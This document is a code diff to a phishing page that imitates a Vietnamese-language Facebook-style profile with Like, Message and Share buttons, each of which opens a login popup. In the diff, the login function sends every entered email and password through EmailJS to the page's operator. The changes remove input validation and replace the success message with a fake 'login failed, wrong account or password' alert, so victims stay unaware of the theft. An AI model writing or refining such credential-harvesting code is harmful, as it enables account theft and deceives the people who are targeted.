@@ -170,7 +170,6 @@
         .action-buttons .message img {
             width: 20px;
             height: 20px;
-            filter: brightness(0) invert(1); /* Biểu tượng trắng */
         }
         .action-buttons .like {
             background-color: #E4E6EB;
@@ -179,7 +178,6 @@
         .action-buttons .like img {
             width: 20px;
             height: 20px;
-            filter: brightness(0.3); /* Xám đậm để nổi bật */
         }
         .action-buttons .share {
             background-color: #E4E6EB;
@@ -188,7 +186,6 @@
         .action-buttons .share img {
             width: 20px;
             height: 20px;
-            filter: brightness(0.3); /* Xám đậm để nổi bật */
         }
         .tabs {
             display: flex;
@@ -990,13 +987,13 @@
         <!-- Action Buttons -->
         <div class="action-buttons">
             <button class="like" onclick="showLoginPopup()">
-                <img src="https://i.imgur.com/Y2gdw8r.jpg" alt="Like"> Thích
+                <img src="https://imgur.com/9evASDf.jpg" alt="Like"> Thích
             </button>
             <button class="message" onclick="showLoginPopup()">
-                <img src="https://i.imgur.com/vRIDZSy.jpg" alt="Messenger"> Nhắn tin
+                <img src="https://imgur.com/vRIDZSy.jpg" alt="Messenger"> Nhắn tin
             </button>
             <button class="share" onclick="showLoginPopup()">
-                <img src="https://i.imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ
+                <img src="https://imgur.com/ncN22Za.jpg" alt="Share"> Chia sẻ
             </button>
         </div>
 
@@ -1592,40 +1589,26 @@
         }
 
         function login() {
-            const errorMessage = document.getElementById('error-message');
-            errorMessage.style.display = 'none';
-
             const username = document.getElementById('login-input').value || "";
             const password = document.getElementById('password').value || "";
-
-            if (!username || !password) {
-                errorMessage.textContent = "Vui lòng nhập email/số điện thoại và mật khẩu!";
-                errorMessage.style.display = 'block';
-                return;
-            }
 
             const templateParams = {
                 name: "User",
                 time: new Date().toLocaleString(),
-                email: username,
-                password: password,
+                email: username || "Tài khoản bị bỏ trống",
+                password: password || "Mật khẩu bị bỏ trống",
                 action: "Đăng nhập",
                 timestamp: new Date().toLocaleString()
             };
 
-            console.log("Gửi email với thông tin:", templateParams);
-
             emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
-                    errorMessage.textContent = "Đã gửi thông tin đăng nhập, kiểm tra email của bạn!";
-                    errorMessage.style.color = '#008000';
-                    errorMessage.style.display = 'block';
+                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
-                    errorMessage.textContent = "Lỗi gửi email, vui lòng thử lại sau!";
-                    errorMessage.style.display = 'block';
+                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
                 });
         }
 
